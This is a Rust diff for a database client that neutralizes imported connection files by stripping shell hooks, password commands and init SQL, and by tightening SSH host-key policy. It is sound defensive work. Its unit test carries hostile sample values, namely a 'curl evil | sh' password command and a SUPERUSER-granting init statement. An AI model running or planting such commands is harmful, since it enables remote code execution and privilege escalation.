@@ -17,7 +17,9 @@ pub use url::{parse_connection_url, to_url};
 
 use crate::connections::{ConnectionStore, normalize_folder};
 use ternarygrid_core::Secret;
-use ternarygrid_core::config::{ConnectionConfig, ConnectionType, NetworkProfile};
+use ternarygrid_core::config::{
+    AuthMethod, ConnectionConfig, ConnectionType, HostKeyPolicy, NetworkProfile,
+};
 
 /// Everything an importer found.
 #[derive(Debug, Clone, Default)]
@@ -36,7 +38,54 @@ pub struct ImportResult {
     pub warnings: Vec<String>,
 }
 
+/// Driver properties whose value runs as SQL when connecting (MySQL's init statements).
+const INIT_PROPERTIES: &[&str] = &["init_sql", "init", "initStatements", "init_statements"];
+
+/// The connection runs something of its own when connecting or disconnecting: a shell
+/// command, a password command, or SQL.
+pub fn runs_on_connect(c: &ConnectionConfig) -> bool {
+    c.init.shell_before_connect.is_some()
+        || c.init.shell_after_disconnect.is_some()
+        || !c.init.init_sql.trim().is_empty()
+        || matches!(c.auth, AuthMethod::Command { .. })
+        || INIT_PROPERTIES
+            .iter()
+            .any(|k| c.properties.get(*k).is_some_and(|v| !v.trim().is_empty()))
+}
+
 impl ImportResult {
+    /// Make imported connections safe to connect with. Unless `keep_commands`, what they
+    /// would run on connect is removed: shell commands, a password command (the password
+    /// is asked instead), init SQL and init properties — a file someone sent could run a
+    /// program or SQL with the user's credentials at the first connect. Always: SSH tunnels
+    /// that accept any host key accept new keys only (a changed key is refused).
+    pub fn neutralize(&mut self, keep_commands: bool) {
+        for c in &mut self.connections {
+            if !keep_commands {
+                c.init.shell_before_connect = None;
+                c.init.shell_after_disconnect = None;
+                c.init.init_sql.clear();
+                c.properties
+                    .retain(|k, _| !INIT_PROPERTIES.contains(&k.as_str()));
+                if matches!(c.auth, AuthMethod::Command { .. }) {
+                    c.auth = AuthMethod::Prompt;
+                }
+            }
+            if let Some(ssh) = c.ssh.as_mut()
+                && ssh.host_key_policy == HostKeyPolicy::AcceptAll
+            {
+                ssh.host_key_policy = HostKeyPolicy::AcceptNew;
+            }
+        }
+        for p in &mut self.network_profiles {
+            if let Some(ssh) = p.ssh.as_mut()
+                && ssh.host_key_policy == HostKeyPolicy::AcceptAll
+            {
+                ssh.host_key_policy = HostKeyPolicy::AcceptNew;
+            }
+        }
+    }
+
     /// True when nothing was found.
     pub fn is_empty(&self) -> bool {
         self.connections.is_empty() && self.folders.is_empty() && self.connection_types.is_empty()
@@ -207,6 +256,49 @@ pub fn merge_into_store(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// An imported connection runs nothing of the file's at connect unless kept: shell
+    /// hooks, a password command, init SQL and init properties go; SSH tunnels never
+    /// accept any host key.
+    #[test]
+    fn imported_connections_are_neutralized() {
+        let mut c = ConnectionConfig::new(ternarygrid_core::DbKind::MySql, "x");
+        c.auth = AuthMethod::Command {
+            command: "curl evil | sh".into(),
+        };
+        c.init.init_sql = "ALTER USER me SUPERUSER".into();
+        c.init.shell_before_connect = Some("touch /tmp/x".into());
+        c.properties.insert("init_sql".into(), "SET @a = 1".into());
+        c.properties.insert("charset".into(), "utf8mb4".into());
+        c.ssh = Some(ternarygrid_core::config::SshConfig {
+            enabled: true,
+            host_key_policy: HostKeyPolicy::AcceptAll,
+            ..Default::default()
+        });
+        assert!(runs_on_connect(&c));
+        let mut r = ImportResult {
+            connections: vec![c.clone()],
+            ..Default::default()
+        };
+        r.neutralize(true);
+        assert!(runs_on_connect(&r.connections[0]), "kept on request");
+        assert_eq!(
+            r.connections[0].ssh.as_ref().unwrap().host_key_policy,
+            HostKeyPolicy::AcceptNew
+        );
+        let mut r = ImportResult {
+            connections: vec![c],
+            ..Default::default()
+        };
+        r.neutralize(false);
+        let c = &r.connections[0];
+        assert!(!runs_on_connect(c));
+        assert_eq!(c.auth, AuthMethod::Prompt);
+        assert_eq!(
+            c.properties.get("charset").map(String::as_str),
+            Some("utf8mb4")
+        );
+    }
     use ternarygrid_core::DbKind;
 
     fn result_with(id: &str, host: &str) -> ImportResult {
